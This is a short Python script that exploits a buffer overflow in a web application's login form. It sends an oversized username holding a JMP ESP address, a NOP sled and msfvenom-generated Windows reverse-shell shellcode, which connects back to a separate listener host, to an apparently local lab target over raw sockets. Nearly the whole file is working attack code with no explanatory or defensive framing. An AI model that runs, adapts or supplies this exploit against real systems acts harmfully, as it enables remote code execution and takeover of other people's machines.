#!/usr/bin/python
import socket
import os
import sys
import struct

#msfvenom -p windows/shell_reverse_tcp LHOS=192.168.0.135 LPORT=1234 EXITFUNC=thread -f c  -b "\x00\x0a\x0d\x25\x26\x2b\x3d"

Shellcode=("\xdb\xc4\xbd\x89\x4e\xa1\xdf\xd9\x74\x24\xf4\x5b\x29\xc9\xb1"
"\x52\x31\x6b\x17\x83\xc3\x04\x03\xe2\x5d\x43\x2a\x08\x89\x01"
"\xd5\xf0\x4a\x66\x5f\x15\x7b\xa6\x3b\x5e\x2c\x16\x4f\x32\xc1"
"\xdd\x1d\xa6\x52\x93\x89\xc9\xd3\x1e\xec\xe4\xe4\x33\xcc\x67"
"\x67\x4e\x01\x47\x56\x81\x54\x86\x9f\xfc\x95\xda\x48\x8a\x08"
"\xca\xfd\xc6\x90\x61\x4d\xc6\x90\x96\x06\xe9\xb1\x09\x1c\xb0"
"\x11\xa8\xf1\xc8\x1b\xb2\x16\xf4\xd2\x49\xec\x82\xe4\x9b\x3c"
"\x6a\x4a\xe2\xf0\x99\x92\x23\x36\x42\xe1\x5d\x44\xff\xf2\x9a"
"\x36\xdb\x77\x38\x90\xa8\x20\xe4\x20\x7c\xb6\x6f\x2e\xc9\xbc"
"\x37\x33\xcc\x11\x4c\x4f\x45\x94\x82\xd9\x1d\xb3\x06\x81\xc6"
"\xda\x1f\x6f\xa8\xe3\x7f\xd0\x15\x46\xf4\xfd\x42\xfb\x57\x6a"
"\xa6\x36\x67\x6a\xa0\x41\x14\x58\x6f\xfa\xb2\xd0\xf8\x24\x45"
"\x16\xd3\x91\xd9\xe9\xdc\xe1\xf0\x2d\x88\xb1\x6a\x87\xb1\x59"
"\x6a\x28\x64\xcd\x3a\x86\xd7\xae\xea\x66\x88\x46\xe0\x68\xf7"
"\x77\x0b\xa3\x90\x12\xf6\x24\x5f\x4a\xf8\x33\x37\x89\xf8\x3f"
"\x1a\x04\x1e\x55\x8a\x41\x89\xc2\x33\xc8\x41\x72\xbb\xc6\x2c"
"\xb4\x37\xe5\xd1\x7b\xb0\x80\xc1\xec\x30\xdf\xbb\xbb\x4f\xf5"
"\xd3\x20\xdd\x92\x23\x2e\xfe\x0c\x74\x67\x30\x45\x10\x95\x6b"
"\xff\x06\x64\xed\x38\x82\xb3\xce\xc7\x0b\x31\x6a\xec\x1b\x8f"
"\x73\xa8\x4f\x5f\x22\x66\x39\x19\x9c\xc8\x93\xf3\x73\x83\x73"
"\x85\xbf\x14\x05\x8a\x95\xe2\xe9\x3b\x40\xb3\x16\xf3\x04\x33"
"\x6f\xe9\xb4\xbc\xba\xa9\xd5\x5e\x6e\xc4\x7d\xc7\xfb\x65\xe0"
"\xf8\xd6\xaa\x1d\x7b\xd2\x52\xda\x63\x97\x57\xa6\x23\x44\x2a"
"\xb7\xc1\x6a\x99\xb8\xc3")


jmp_esp= struct.pack("<I", 0x7719BC93 )
crash = "A" * 780 + jmp_esp + "\x90"* 15 + Shellcode


fuzz="username="+crash+"&password=A"

buffer="POST /login HTTP/1.1\r\n"
buffer+="Host: 192.1.0.134\r\n"
buffer+="User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0\r\n"
buffer+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
buffer+="Accept-Language: en-US,en;q=0.5\r\n"
buffer+="Referer: http://192.168.0.134/login\r\n"
buffer+="Connection: close\r\n"
buffer+="Content-Type: application/x-www-form-urlencoded\r\n"
buffer+="Content-Length: "+str(len(fuzz))+"\r\n"
buffer+="\r\n"
buffer+=fuzz

expl = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
expl.connect(("192.168.0.134", 80))
expl.send(buffer)
expl.close()